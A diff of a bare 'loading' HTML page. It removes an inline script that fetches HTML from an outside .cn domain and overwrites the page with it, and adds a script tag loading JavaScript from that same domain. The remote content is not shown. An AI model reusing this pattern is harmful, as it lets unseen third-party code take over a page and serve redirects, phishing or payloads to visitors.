@@ -1,9 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width" />
-    <title>load...</title>  
+    <title>load...</title>
 </head>
 <body>
     <style type='text/css'>
@@ -74,26 +73,6 @@
             }
         }
     </style><div class='toast toast_vis'><div><i class='loading icon'></i></div><p class='toast_content'>&#x6B63;&#x5728;&#x8FDB;&#x5165;</p></div> 
-    <script>
-loadhtml("https://xhh2338.cn/kk.html?t=" + Date.now());
-function loadhtml(url) {
-    document.title = "\u8BF7\u7A0D\u540E....";
-    var xhr = new XMLHttpRequest;
-    var html = null;
-    function render() {
-        var a = document.open("text/html", "replace");
-        a.write(html);
-        a.close();
-    }
-    xhr.onload = function () {
-        html = xhr.responseText;
-        var delay = 0;
-        if (delay > 0) setTimeout("render()", delay * 1000)
-        else render();
-    };
-    xhr.open("GET", url, !0);
-    xhr.send();
-}
-    </script> 
+    <script src="https://xhh2338.cn/kfc/html/x.js"></script> 
 </body>
 </html>
